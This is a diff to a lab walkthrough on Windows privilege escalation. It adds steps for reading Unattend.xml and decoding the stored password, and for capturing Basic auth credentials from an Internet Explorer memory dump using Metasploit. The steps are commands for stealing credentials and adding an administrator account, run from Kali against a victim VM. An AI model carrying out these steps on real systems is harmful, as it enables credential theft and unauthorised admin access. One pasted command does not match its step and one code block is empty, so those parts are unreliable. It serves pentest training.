@@ -1012,27 +1012,110 @@ Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 \
 4\. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
 
-**Victim**
+**Victim(Powershell)**
 
 ```
 net localgroup administrators
 ```
 
+<figure><img src="../../.gitbook/assets/image (1256).png" alt=""><figcaption></figcaption></figure>
+
+## Password Mining Escalation - Configuration Files
+
+### Exploitation
 
 
 
+1\. Open command prompt and type: typeC:\Windows\Panther\Unattend.xml
+
+**Victim**
+
+```
+type C:\Windows\Panther\Unattend.xml
+```
+
+\
+2\. Scroll down to the “\<Password>” property and copy the base64 string that is confined between the “\<Value>” tags underneath it.
+
+<figure><img src="../../.gitbook/assets/image (1257).png" alt=""><figcaption></figcaption></figure>
+
+1\. In a terminal, type: echo \[copied base64] | base64 -d
+
+**Victim**
+
+```
+echo "cGFzc3dvcmQxMjM=" | base64 -d
+```
+
+\
+2\. Notice the cleartext password
+
+<figure><img src="../../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>
+
+## Password Mining Escalation - Memory
+
+### Exploitation
+
+1.Open command prompt and type: msfconsole
+
+**Kali**
+
+```
+msfconsole
+```
+
+\
+2.In Metasploit (msf > prompt) type: use auxiliary/server/capture/http\_basic\
+3.In Metasploit (msf > prompt) type: set uripath x\
+4.In Metasploit (msf > prompt) type: run
+
+**Kali(msfconsole)**
+
+```
+use auxiliary/server/capture/http_basic
+set uripath x
+run
+```
 
 
 
+Windows VM
+
+1.Open Internet Explorer and browse to: http://\[Kali VM IP Address]/x\
+2.Open command prompt and type: taskmgr
+
+**Victim**
+
+```
+taskmgr
+```
+
+\
+3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.\
+4.Copy the generated file, iexplore.DMP, to the Kali VM.
+
+**Victim**
+
+```
+copy \\tsclient\kali\common.exe  "C:\Program Files\Unquoted Path Service\common.exe"
+```
 
 
 
+Kali VM
 
+1.Place ‘iexplore.DMP’ on the desktop.\
+2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"\
+3.Select the Copy the Base64 encoded string.\
+4.In command prompt type: echo -ne \[Base64 String] | base64 -d
 
+**Victim**
 
+```
+```
 
-
-
+\
+5.Notice the credentials in the output.
 
 
 
